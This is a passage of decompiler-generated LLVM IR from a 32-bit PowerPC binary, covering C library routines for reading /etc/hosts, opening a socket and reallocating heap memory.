dec_label_pc_10025e90:                            ; preds = %dec_label_pc_10025e7c
  %v3_10025e88 = icmp eq i8 %v2_10025e7c, 10
  %v3_10025e7c = zext i8 %v2_10025e7c to i32
  %v1_10025e84 = mul nuw nsw i32 %v3_10025e7c, 2
  %v1_10025e90 = load i32, i32* %r11.global-to-local, align 4
  %v2_10025e90 = add i32 %v1_10025e90, %v1_10025e84
  %v3_10025e90 = inttoptr i32 %v2_10025e90 to i16*
  %v4_10025e90 = load i16, i16* %v3_10025e90, align 2
  %v1_10025e94 = and i16 %v4_10025e90, 32
  %v3_10025e94.not = icmp ne i16 %v1_10025e94, 0
  %brmerge = or i1 %v3_10025e88, %v3_10025e94.not
  br i1 %brmerge, label %dec_label_pc_10025eac, label %dec_label_pc_10025e78

dec_label_pc_10025ea4:                            ; preds = %dec_label_pc_10025ec0
  %v0_10025ea4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10025ea4 = trunc i32 %v0_10025ea4 to i8
  store i8 %v1_10025ea4, i8* %v1_10025eac, align 1
  %v0_10025ea8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10025ea8 = add i32 %v0_10025ea8, 1
  store i32 %v1_10025ea8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10025eac

dec_label_pc_10025eac:                            ; preds = %dec_label_pc_10025e90, %dec_label_pc_10025e7c, %dec_label_pc_10025ea4
  %v0_10025ed8 = phi i32 [ %v1_10025ea8, %dec_label_pc_10025ea4 ], [ %v0_10025e78, %dec_label_pc_10025e7c ], [ %v0_10025e78, %dec_label_pc_10025e90 ]
  %v1_10025eac = inttoptr i32 %v0_10025ed8 to i8*
  %v2_10025eac = load i8, i8* %v1_10025eac, align 1
  %v3_10025eac = zext i8 %v2_10025eac to i32
  %v3_10025eb0 = icmp eq i8 %v2_10025eac, 0
  %v1_10025eb4 = mul nuw nsw i32 %v3_10025eac, 2
  store i32 %v1_10025eb4, i32* %r11.global-to-local, align 4
  br i1 %v3_10025eb0, label %dec_label_pc_10025ed4, label %dec_label_pc_10025ec0

dec_label_pc_10025ec0:                            ; preds = %dec_label_pc_10025eac
  %v3_10025eb8 = icmp eq i8 %v2_10025eac, 10
  %v3_10025ec0 = load i32, i32* @global_var_1004515c, align 4
  %v2_10025ec4 = add i32 %v3_10025ec0, %v1_10025eb4
  %v3_10025ec4 = inttoptr i32 %v2_10025ec4 to i16*
  %v4_10025ec4 = load i16, i16* %v3_10025ec4, align 2
  %v1_10025ec8 = and i16 %v4_10025ec4, 32
  %v3_10025ec8.not = icmp ne i16 %v1_10025ec8, 0
  %brmerge27 = or i1 %v3_10025eb8, %v3_10025ec8.not
  br i1 %brmerge27, label %dec_label_pc_10025ea4, label %dec_label_pc_10025ed4

dec_label_pc_10025ed4:                            ; preds = %dec_label_pc_10025ec0, %dec_label_pc_10025eac
  %v0_10025ed4 = load i32, i32* @r27, align 4
  %v1_10025ed4 = add i32 %v0_10025ed4, 1
  store i32 %v1_10025ed4, i32* @r27, align 4
  %v2_10025ed8 = load i8, i8* %v1_10025eac, align 1
  %v3_10025edc = icmp eq i8 %v2_10025ed8, 0
  br i1 %v3_10025edc, label %dec_label_pc_10025eec, label %dec_label_pc_10025ee4

dec_label_pc_10025ee4:                            ; preds = %dec_label_pc_10025e50, %dec_label_pc_10025ed4
  %v0_10025e70 = phi i32 [ %v0_10025ed8, %dec_label_pc_10025ed4 ], [ %v0_10025ed89, %dec_label_pc_10025e50 ]
  %v0_10025e64 = phi i32 [ %v1_10025ed4, %dec_label_pc_10025ed4 ], [ 0, %dec_label_pc_10025e50 ]
  %tmp33 = icmp slt i32 %v0_10025e64, 5
  br i1 %tmp33, label %dec_label_pc_10025e64, label %dec_label_pc_10025eec

dec_label_pc_10025eec:                            ; preds = %dec_label_pc_10025ed4, %dec_label_pc_10025ee4, %dec_label_pc_10025e50
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1002fb6c.1375 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10025f00 = call i32 @__GI_strcoll(i8* %v3_10025f00, i32 ptrtoint ([11 x i8]* @global_var_1002fb6c.1375 to i32))
  store i32 %v4_10025f00, i32* %r3.global-to-local, align 4
  %v3_10025f04 = icmp eq i32 %v4_10025f00, 0
  br i1 %v3_10025f04, label %dec_label_pc_10025f30, label %dec_label_pc_10025f54

dec_label_pc_10025f10:                            ; preds = %dec_label_pc_10025f48
  %v1_10025f10 = add i32 %v2_10025f38, 24
  %v2_10025f10 = inttoptr i32 %v1_10025f10 to i32*
  %v3_10025f10 = load i32, i32* %v2_10025f10, align 4
  store i32 %v3_10025f10, i32* %r3.global-to-local, align 4
  store i32 268590872, i32* @lr, align 4
  %v1_10025f14 = call i32 @__GI_strdup(i32 %v3_10025f10)
  store i32 %v1_10025f14, i32* %r3.global-to-local, align 4
  %v0_10025f1c = load i32, i32* @r29, align 4
  %v1_10025f1c = add i32 %v0_10025f1c, 1
  store i32 %v1_10025f1c, i32* %r11.global-to-local, align 4
  %v1_10025f20 = mul i32 %v0_10025f1c, 4
  store i32 %v1_10025f1c, i32* @global_var_1004528c.1213, align 4
  %v3_10025f2c = add i32 %v1_10025f20, ptrtoint (i32* @global_var_1004ef04.1214 to i32)
  %v4_10025f2c = inttoptr i32 %v3_10025f2c to i32*
  store i32 %v1_10025f14, i32* %v4_10025f2c, align 4
  br label %dec_label_pc_10025f30

dec_label_pc_10025f30:                            ; preds = %dec_label_pc_10025eec, %dec_label_pc_10025f10
  %v0_10025f30 = load i32, i32* @r31, align 4
  %v1_10025f30 = load i32, i32* @r27, align 4
  %v2_10025f30 = icmp slt i32 %v0_10025f30, %v1_10025f30
  %v1_10025f34 = mul i32 %v0_10025f30, 4
  %v0_10025f38 = load i32, i32* @r1, align 4
  %v2_10025f38 = add i32 %v0_10025f38, %v1_10025f34
  br i1 %v2_10025f30, label %dec_label_pc_10025f48, label %dec_label_pc_10025f54

dec_label_pc_10025f48:                            ; preds = %dec_label_pc_10025f30
  %v3_10025f48 = load i32, i32* @global_var_1004528c.1213, align 4
  %tmp35 = icmp slt i32 %v3_10025f48, 3
  br i1 %tmp35, label %dec_label_pc_10025f10, label %dec_label_pc_10025f54

dec_label_pc_10025f54:                            ; preds = %dec_label_pc_10025f48, %dec_label_pc_10025f30, %dec_label_pc_10025eec
  %v0_10025f58 = load i32, i32* @r30, align 4
  store i32 %v0_10025f58, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002fb78.1376 to i32), i32* @r4, align 4
  %v3_10025f60 = inttoptr i32 %v0_10025f58 to i8*
  %v4_10025f60 = call i32 @__GI_strcoll(i8* %v3_10025f60, i32 ptrtoint ([7 x i8]* @global_var_1002fb78.1376 to i32))
  store i32 %v4_10025f60, i32* %r3.global-to-local, align 4
  %v3_10025f64 = icmp eq i32 %v4_10025f60, 0
  br i1 %v3_10025f64, label %dec_label_pc_10025fa4.preheader, label %dec_label_pc_10025f6c

dec_label_pc_10025f6c:                            ; preds = %dec_label_pc_10025f54
  %v0_10025f70 = load i32, i32* @r30, align 4
  store i32 %v0_10025f70, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002fb80.1377 to i32), i32* @r4, align 4
  %v3_10025f78 = inttoptr i32 %v0_10025f70 to i8*
  %v4_10025f78 = call i32 @__GI_strcoll(i8* %v3_10025f78, i32 ptrtoint ([7 x i8]* @global_var_1002fb80.1377 to i32))
  store i32 %v4_10025f78, i32* %r3.global-to-local, align 4
  %v3_10025f7c = icmp eq i32 %v4_10025f78, 0
  br i1 %v3_10025f7c, label %dec_label_pc_10025fa4.preheader, label %dec_label_pc_10026010.backedge

dec_label_pc_10025fa4.preheader:                  ; preds = %dec_label_pc_10025f54, %dec_label_pc_10025f6c
  store i32 ptrtoint (i32* @global_var_1004eef4.1365 to i32), i32* @r31, align 4
  %v3_10025fb041 = load i32, i32* @global_var_10045290.1363, align 4
  %v2_10025fb443 = icmp sgt i32 %v3_10025fb041, 0
  %v1_10025fb845 = add i32 %v3_10025fb041, -1
  %v1_10025fbc46 = mul i32 %v1_10025fb845, 4
  store i32 %v1_10025fbc46, i32* %r11.global-to-local, align 4
  br i1 %v2_10025fb443, label %dec_label_pc_10025f88, label %dec_label_pc_10025fc4

dec_label_pc_10025f88:                            ; preds = %dec_label_pc_10025fa4.preheader, %dec_label_pc_10025f88
  %v1_10025fbc48 = phi i32 [ %v1_10025fbc, %dec_label_pc_10025f88 ], [ %v1_10025fbc46, %dec_label_pc_10025fa4.preheader ]
  %v1_10025fb847 = phi i32 [ %v1_10025fb8, %dec_label_pc_10025f88 ], [ %v1_10025fb845, %dec_label_pc_10025fa4.preheader ]
  %v2_10025f88 = add i32 %v1_10025fbc48, ptrtoint (i32* @global_var_1004eef4.1365 to i32)
  %v3_10025f88 = inttoptr i32 %v2_10025f88 to i32*
  %v4_10025f88 = load i32, i32* %v3_10025f88, align 4
  store i32 %v4_10025f88, i32* @r3, align 4
  store i32 %v1_10025fb847, i32* @global_var_10045290.1363, align 4
  store i32 268590996, i32* @lr, align 4
  %v0_10025f90 = call i32 @free()
  store i32 %v0_10025f90, i32* %r3.global-to-local, align 4
  %v3_10025f94 = load i32, i32* @global_var_10045290.1363, align 4
  %v1_10025f9c = mul i32 %v3_10025f94, 4
  %v1_10025fa0 = load i32, i32* @r31, align 4
  %v3_10025fa0 = add i32 %v1_10025fa0, %v1_10025f9c
  %v4_10025fa0 = inttoptr i32 %v3_10025fa0 to i32*
  store i32 0, i32* %v4_10025fa0, align 4
  store i32 ptrtoint (i32* @global_var_1004eef4.1365 to i32), i32* @r31, align 4
  %v3_10025fb0 = load i32, i32* @global_var_10045290.1363, align 4
  %v2_10025fb4 = icmp sgt i32 %v3_10025fb0, 0
  %v1_10025fb8 = add i32 %v3_10025fb0, -1
  %v1_10025fbc = mul i32 %v1_10025fb8, 4
  store i32 %v1_10025fbc, i32* %r11.global-to-local, align 4
  br i1 %v2_10025fb4, label %dec_label_pc_10025f88, label %dec_label_pc_10025fc4

dec_label_pc_10025fc4:                            ; preds = %dec_label_pc_10025f88, %dec_label_pc_10025fa4.preheader
  %v3_1002600459 = phi i32 [ %v3_10025fb041, %dec_label_pc_10025fa4.preheader ], [ %v3_10025fb0, %dec_label_pc_10025f88 ]
  %v1_10025fec49 = load i32, i32* @r27, align 4
  %v2_10025fec50 = icmp sgt i32 %v1_10025fec49, 1
  %v0_10025ff453 = load i32, i32* @r1, align 4
  %v2_10025ff454 = add i32 %v0_10025ff453, 4
  br i1 %v2_10025fec50, label %dec_label_pc_10026004, label %dec_label_pc_10026010.backedge

dec_label_pc_10025fcc:                            ; preds = %dec_label_pc_10026004
  %v1_10025fcc = add i32 %v2_10025ff455, 24
  %v2_10025fcc = inttoptr i32 %v1_10025fcc to i32*
  %v3_10025fcc = load i32, i32* %v2_10025fcc, align 4
  store i32 %v3_10025fcc, i32* %r3.global-to-local, align 4
  store i32 268591060, i32* @lr, align 4
  %v1_10025fd0 = call i32 @__GI_strdup(i32 %v3_10025fcc)
  store i32 %v1_10025fd0, i32* %r3.global-to-local, align 4
  %v0_10025fd8 = load i32, i32* @r29, align 4
  %v1_10025fd8 = add i32 %v0_10025fd8, 1
  store i32 %v1_10025fd8, i32* %r11.global-to-local, align 4
  %v1_10025fdc = mul i32 %v0_10025fd8, 4
  store i32 %v1_10025fd8, i32* @global_var_10045290.1363, align 4
  %v3_10025fe8 = add i32 %v1_10025fdc, ptrtoint (i32* @global_var_1004eef4.1365 to i32)
  %v4_10025fe8 = inttoptr i32 %v3_10025fe8 to i32*
  store i32 %v1_10025fd0, i32* %v4_10025fe8, align 4
  %v0_10025fec.pre = load i32, i32* @r31, align 4
  %v1_10025fec = load i32, i32* @r27, align 4
  %v2_10025fec = icmp slt i32 %v0_10025fec.pre, %v1_10025fec
  br i1 %v2_10025fec, label %dec_label_pc_10025fcc.dec_label_pc_10026004_crit_edge, label %dec_label_pc_10026010.backedge

dec_label_pc_10025fcc.dec_label_pc_10026004_crit_edge: ; preds = %dec_label_pc_10025fcc
  %v0_10025ff4 = load i32, i32* @r1, align 4
  %v1_10025ff0 = mul i32 %v0_10025fec.pre, 4
  %v2_10025ff4 = add i32 %v0_10025ff4, %v1_10025ff0
  %v3_10026004.pre = load i32, i32* @global_var_10045290.1363, align 4
  br label %dec_label_pc_10026004

dec_label_pc_10026004:                            ; preds = %dec_label_pc_10025fc4, %dec_label_pc_10025fcc.dec_label_pc_10026004_crit_edge
  %v3_10026004 = phi i32 [ %v3_10026004.pre, %dec_label_pc_10025fcc.dec_label_pc_10026004_crit_edge ], [ %v3_1002600459, %dec_label_pc_10025fc4 ]
  %v2_10025ff455 = phi i32 [ %v2_10025ff4, %dec_label_pc_10025fcc.dec_label_pc_10026004_crit_edge ], [ %v2_10025ff454, %dec_label_pc_10025fc4 ]
  %tmp37 = icmp slt i32 %v3_10026004, 4
  br i1 %tmp37, label %dec_label_pc_10025fcc, label %dec_label_pc_10026010.backedge

dec_label_pc_10026010:                            ; preds = %dec_label_pc_10026010.backedge, %dec_label_pc_10026010.preheader
  %v0_1002601c = phi i32 [ %v0_1002601c.pre, %dec_label_pc_10026010.backedge ], [ %v0_1002601c16, %dec_label_pc_10026010.preheader ]
  store i32 %v2_10026010, i32* %r3.global-to-local, align 4
  store i32 268591140, i32* @lr, align 4
  %v3_10026020 = call i32 @fgets(i32 %v2_10026010, i32 128, i32 %v0_1002601c)
  store i32 %v3_10026020, i32* %r3.global-to-local, align 4
  %v3_10026024 = icmp eq i32 %v3_10026020, 0
  br i1 %v3_10026024, label %dec_label_pc_10026034, label %dec_label_pc_10025e1c.preheader

dec_label_pc_10025e1c.preheader:                  ; preds = %dec_label_pc_10026010
  store i32 %v2_10026010, i32* %r3.global-to-local, align 4
  %v2_10025e1c3 = load i8, i8* %v1_10025e1c2, align 4
  %v3_10025e1c4 = zext i8 %v2_10025e1c3 to i32
  store i32 %v3_10025e1c4, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_10025e246 = icmp eq i8 %v2_10025e1c3, 0
  %v1_10025e288 = mul nuw nsw i32 %v3_10025e1c4, 2
  store i32 %v1_10025e288, i32* @r10, align 4
  br i1 %v3_10025e246, label %dec_label_pc_10026010.backedge, label %dec_label_pc_10025e30.lr.ph

dec_label_pc_10025e30.lr.ph:                      ; preds = %dec_label_pc_10025e1c.preheader
  %v3_10025e30.pre = load i32, i32* @global_var_1004515c, align 4
  br label %dec_label_pc_10025e30

dec_label_pc_10026034:                            ; preds = %dec_label_pc_10026010
  %v0_10026034 = load i32, i32* @r26, align 4
  store i32 %v0_10026034, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002603c.1378 to i32), i32* @lr, align 4
  %v1_10026038 = inttoptr i32 %v0_10026034 to i16*
  %v2_10026038 = call i32 @__GI_fclose(i16* %v1_10026038)
  store i32 %v2_10026038, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002604c

dec_label_pc_10026040:                            ; preds = %dec_label_pc_10025dfc
  %v0_10026040 = call i32 @__GI___h_errno_location()
  store i32 %v0_10026040, i32* %r3.global-to-local, align 4
  %v2_10026048 = inttoptr i32 %v0_10026040 to i32*
  store i32 3, i32* %v2_10026048, align 4
  br label %dec_label_pc_1002604c

dec_label_pc_1002604c:                            ; preds = %entry, %dec_label_pc_10026034, %dec_label_pc_10026040
  store i32 %v2_10025db8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268591192, i32* @lr, align 4
  %v0_10026054 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_10026054, i32* %r3.global-to-local, align 4
  ret i32 %v0_10026054

; uselistorder directives
  uselistorder i32 %v3_10025e1c4, { 0, 2, 1 }
  uselistorder i32 %v1_10025fbc46, { 1, 0 }
  uselistorder i32 %v1_10025fb845, { 1, 0 }
  uselistorder i32 %v0_10025e64, { 1, 0 }
  uselistorder i32 %v1_10025eb4, { 1, 0 }
  uselistorder i8* %v1_10025eac, { 0, 2, 1 }
  uselistorder i8 %v2_10025e7c, { 2, 0, 1 }
  uselistorder i32 %v0_10025e78, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10025e28, { 1, 0 }
  uselistorder i32 %v3_10025e1c, { 1, 0, 2 }
  uselistorder i32 %v1_10025e18, { 0, 2, 1 }
  uselistorder i32 %v2_10026010, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10025db8, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 26, 2, 29, 3, 1, 17, 18, 4, 5, 28, 6, 7, 27, 8, 25, 9, 10, 11, 12, 14, 15, 13, 0, 16, 19, 20, 21, 24, 23, 22 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0, 6, 5 }
  uselistorder i32* @global_var_10045290.1363, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1004eef4.1365 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32* @r1, { 33, 0, 34, 10, 2, 11, 30, 31, 12, 14, 13, 1, 3, 4, 5, 6, 7, 8, 9, 35, 36, 37, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 38 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ef04.1214 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10045088.1212 to i32), { 9, 16, 1, 12, 17, 0, 13, 18, 2, 14, 19, 4, 3, 10, 20, 6, 5, 11, 8, 7, 15 }
  uselistorder label %dec_label_pc_1002604c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026004, { 1, 0 }
  uselistorder label %dec_label_pc_10025f88, { 1, 0 }
  uselistorder label %dec_label_pc_10025fa4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10025f30, { 1, 0 }
  uselistorder label %dec_label_pc_10025eec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10025ee4, { 1, 0 }
  uselistorder label %dec_label_pc_10025eac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025e7c, { 1, 0 }
  uselistorder label %dec_label_pc_10026010.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10026010.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_10026070 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268591280, i32* @lr, align 4
  %v8_100260ac = inttoptr i32 %arg3 to i32*
  %v9_100260ac = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v8_100260ac, i32 %arg4, i32 %arg5, i32 %v4_10026070)
  ret i32 %v9_100260ac
}

define i32 @__get_hosts_byaddr_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-80 = alloca i32, align 4
  %v3_100260c4 = icmp eq i32 %arg3, 2
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg4, i32* @r30, align 4
  store i32 %arg5, i32* @r28, align 4
  store i32 %arg6, i32* @r27, align 4
  store i32 %arg7, i32* @r26, align 4
  %v0_100260f4 = load i32, i32* @r10, align 4
  store i32 %v0_100260f4, i32* @r25, align 4
  br i1 %v3_100260c4, label %dec_label_pc_10026104, label %dec_label_pc_100260fc

dec_label_pc_100260fc:                            ; preds = %entry
  %v3_100260d0 = icmp eq i32 %arg3, 10
  br i1 %v3_100260d0, label %dec_label_pc_1002610c, label %dec_label_pc_1002615c

dec_label_pc_10026104:                            ; preds = %entry
  %v3_100260d4 = icmp eq i32 %arg2, 4
  br i1 %v3_100260d4, label %dec_label_pc_10026114, label %dec_label_pc_1002615c

dec_label_pc_1002610c:                            ; preds = %dec_label_pc_100260fc
  %v3_1002610c = icmp eq i32 %arg2, 16
  br i1 %v3_1002610c, label %dec_label_pc_10026114, label %dec_label_pc_1002615c

dec_label_pc_10026114:                            ; preds = %dec_label_pc_10026104, %dec_label_pc_1002610c
  %v2_10026114 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10026114, i32* @r29, align 4
  store i32 268591404, i32* @lr, align 4
  %v4_10026128 = call i32 @__GI_inet_ntop(i32 %arg3, i32 %arg1, i32 %v2_10026114, i32 46)
  %v0_10026130 = load i32, i32* @r31, align 4
  %v0_10026134 = load i32, i32* @r30, align 4
  %v0_10026138 = load i32, i32* @r28, align 4
  %v0_1002613c = load i32, i32* @r27, align 4
  %v0_10026140 = load i32, i32* @r26, align 4
  store i32 %v0_10026140, i32* @r10, align 4
  %v0_1002614c = load i32, i32* @r25, align 4
  store i32 ptrtoint (i32* @global_var_10026154.1380 to i32), i32* @lr, align 4
  %v8_10026150 = inttoptr i32 %v0_10026134 to i32*
  %v9_10026150 = call i32 @__read_etc_hosts_r(i32 0, i32 %v2_10026114, i32 %v0_10026130, i32 2, i32* %v8_10026150, i32 %v0_10026138, i32 %v0_1002613c, i32 %v0_1002614c)
  br label %dec_label_pc_1002615c

dec_label_pc_1002615c:                            ; preds = %dec_label_pc_100260fc, %dec_label_pc_1002610c, %dec_label_pc_10026104, %dec_label_pc_10026114
  %storemerge = phi i32 [ %v9_10026150, %dec_label_pc_10026114 ], [ 0, %dec_label_pc_10026104 ], [ 0, %dec_label_pc_1002610c ], [ 0, %dec_label_pc_100260fc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1002615c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10026114, { 1, 0 }
}

define i32 @__opensock() local_unnamed_addr {
entry:
  %v0_10026170 = load i32, i32* @lr, align 4
  store i32 268591504, i32* @lr, align 4
  %v3_1002618c = call i32 @socket(i32 10, i32 2, i32 0)
  %tmp5 = icmp sgt i32 %v3_1002618c, -1
  br i1 %tmp5, label %dec_label_pc_100261b8, label %dec_label_pc_100261a0

dec_label_pc_100261a0:                            ; preds = %entry
  store i32 %v0_10026170, i32* @lr, align 4
  %v3_100261b4 = call i32 @socket(i32 2, i32 2, i32 0)
  br label %dec_label_pc_100261b8

dec_label_pc_100261b8:                            ; preds = %entry, %dec_label_pc_100261a0
  %v0_100261c8 = phi i32 [ %v3_1002618c, %entry ], [ %v3_100261b4, %dec_label_pc_100261a0 ]
  ret i32 %v0_100261c8

; uselistorder directives
  uselistorder label %dec_label_pc_100261b8, { 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v3_100261cc = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_100261cc, label %dec_label_pc_100261e8, label %dec_label_pc_100261f4

dec_label_pc_100261e8:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_100261ec.1381 to i32), i32* @lr, align 4
  %v0_100261e8 = call i32 @free()
  br label %dec_label_pc_10026200

dec_label_pc_100261f4:                            ; preds = %entry
  %v3_100261f4 = icmp eq i32 %arg1, 0
  br i1 %v3_100261f4, label %dec_label_pc_10026200, label %dec_label_pc_1002620c

dec_label_pc_10026200:                            ; preds = %dec_label_pc_100261f4, %dec_label_pc_100261e8
  %storemerge = phi i32 [ 0, %dec_label_pc_100261e8 ], [ %arg2, %dec_label_pc_100261f4 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268591620, i32* @lr, align 4
  %v0_10026200 = call i32 @malloc()
  store i32 %v0_10026200, i32* @r28, align 4
  br label %dec_label_pc_100262e4

dec_label_pc_1002620c:                            ; preds = %dec_label_pc_100261f4
  %v1_1002620c = add i32 %arg2, 7
  %v1_10026210 = add i32 %arg1, -4
  store i32 %v1_10026210, i32* @r27, align 4
  %v1_10026214 = call i32 @__asm_rlwinm(i32 %v1_1002620c, i32 0, i32 0, i32 29)
  store i32 %v1_10026214, i32* @r31, align 4
  %v2_10026218 = inttoptr i32 %v1_10026210 to i32*
  %v3_10026218 = load i32, i32* %v2_10026218, align 4
  store i32 %v3_10026218, i32* @r30, align 4
  %v2_1002621c = icmp ugt i32 %v1_10026214, 11
  br i1 %v2_1002621c, label %dec_label_pc_10026228, label %dec_label_pc_10026224

dec_label_pc_10026224:                            ; preds = %dec_label_pc_1002620c
  store i32 12, i32* @r31, align 4
  br label %dec_label_pc_10026228

dec_label_pc_10026228:                            ; preds = %dec_label_pc_1002620c, %dec_label_pc_10026224
  %v0_100262a8 = phi i32 [ %v1_10026214, %dec_label_pc_1002620c ], [ 12, %dec_label_pc_10026224 ]
  %v3_10026228 = icmp ugt i32 %v0_100262a8, %v3_10026218
  br i1 %v3_10026228, label %dec_label_pc_10026230, label %dec_label_pc_100262a8

dec_label_pc_10026230:                            ; preds = %dec_label_pc_10026228
  store i32 ptrtoint (i32* @global_var_1004da34.971 to i32), i32* @r29, align 4
  store i32 268591680, i32* @lr, align 4
  %v1_1002623c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da34.971 to i32))
  %v0_10026244 = load i32, i32* @r27, align 4
  %v1_10026244 = load i32, i32* @r30, align 4
  %v2_10026244 = add i32 %v1_10026244, %v0_10026244
  %v1_10026248 = load i32, i32* @r31, align 4
  %v2_10026248 = sub i32 %v1_10026248, %v1_10026244
  %v4_10026250 = call i32 @__heap_alloc_at(i32* nonnull @global_var_10045150, i32 %v2_10026244, i32 %v2_10026248)
  store i32 %v4_10026250, i32* @r27, align 4
  %v0_10026258 = load i32, i32* @r29, align 4
  store i32 %v0_10026258, i32* @r3, align 4
  store i32 268591712, i32* @lr, align 4
  %v0_1002625c = call i32 @pthread_mutex_unlock()
  %v0_10026260 = load i32, i32* @r27, align 4
  %v3_10026260 = icmp eq i32 %v0_10026260, 0
  br i1 %v3_10026260, label %dec_label_pc_10026274, label %dec_label_pc_10026268

dec_label_pc_10026268:                            ; preds = %dec_label_pc_10026230
  %v0_10026268 = load i32, i32* @r30, align 4
  %v2_10026268 = add i32 %v0_10026268, %v0_10026260
  %v1_1002626c = load i32, i32* @r28, align 4
  %v2_1002626c = add i32 %v1_1002626c, -4
  %v3_1002626c = inttoptr i32 %v2_1002626c to i32*
  store i32 %v2_10026268, i32* %v3_1002626c, align 4
  br label %dec_label_pc_100262e4

dec_label_pc_10026274:                            ; preds = %dec_label_pc_10026230
  %v0_10026274 = load i32, i32* @r31, align 4
  %v1_10026274 = add i32 %v0_10026274, -4
  store i32 %v1_10026274, i32* @r3, align 4
  store i32 268591740, i32* @lr, align 4
  %v0_10026278 = call i32 @malloc()
  store i32 %v0_10026278, i32* @r3, align 4
  store i32 %v0_10026278, i32* @r31, align 4
  %v3_1002627c = icmp eq i32 %v0_10026278, 0
  br i1 %v3_1002627c, label %dec_label_pc_10026284, label %dec_label_pc_1002628c

dec_label_pc_10026284:                            ; preds = %dec_label_pc_10026274
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100262e4

dec_label_pc_1002628c:                            ; preds = %dec_label_pc_10026274
  %v0_1002628c = load i32, i32* @r28, align 4
  store i32 %v0_1002628c, i32* @r4, align 4
  %v0_10026290 = load i32, i32* @r30, align 4
  %v1_10026290 = add i32 %v0_10026290, -4
  store i32 %v1_10026290, i32* @r5, align 4
  store i32 268591768, i32* @lr, align 4
  %v0_10026294 = call i32 @memcpy()
  %v0_10026298 = load i32, i32* @r28, align 4
  store i32 %v0_10026298, i32* @r3, align 4
  store i32 268591776, i32* @lr, align 4
  %v0_1002629c = call i32 @free()
  %v0_100262a0 = load i32, i32* @r31, align 4
  store i32 %v0_100262a0, i32* @r28, align 4
  br label %dec_label_pc_100262e4

dec_label_pc_100262a8:                            ; preds = %dec_label_pc_10026228
  %v1_100262a8 = add i32 %v0_100262a8, 28
  %v3_100262ac = icmp ugt i32 %v1_100262a8, %v3_10026218
  br i1 %v3_100262ac, label %dec_label_pc_100262e4, label %dec_label_pc_100262b4

dec_label_pc_100262b4:                            ; preds = %dec_label_pc_100262a8
  store i32 ptrtoint (i32* @global_var_1004da34.971 to i32), i32* @r29, align 4
  store i32 268591812, i32* @lr, align 4
  %v1_100262c0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da34.971 to i32))
  %v0_100262c8 = load i32, i32* @r27, align 4
  %v1_100262c8 = load i32, i32* @r31, align 4
  %v2_100262c8 = add i32 %v1_100262c8, %v0_100262c8
  %v1_100262cc = load i32, i32* @r30, align 4
  %v2_100262cc = sub i32 %v1_100262cc, %v1_100262c8
  store i32 268591832, i32* @lr, align 4
  %v4_100262d4 = call i32 @__heap_free(i32* nonnull @global_var_10045150, i32 %v2_100262c8, i32 %v2_100262cc)
  %v0_100262d8 = load i32, i32* @r29, align 4
  store i32 %v0_100262d8, i32* @r3, align 4
  store i32 268591840, i32* @lr, align 4
  %v0_100262dc = call i32 @pthread_mutex_unlock()
  %v0_100262e0 = load i32, i32* @r31, align 4
  %v1_100262e0 = load i32, i32* @r28, align 4
  %v2_100262e0 = add i32 %v1_100262e0, -4
  %v3_100262e0 = inttoptr i32 %v2_100262e0 to i32*
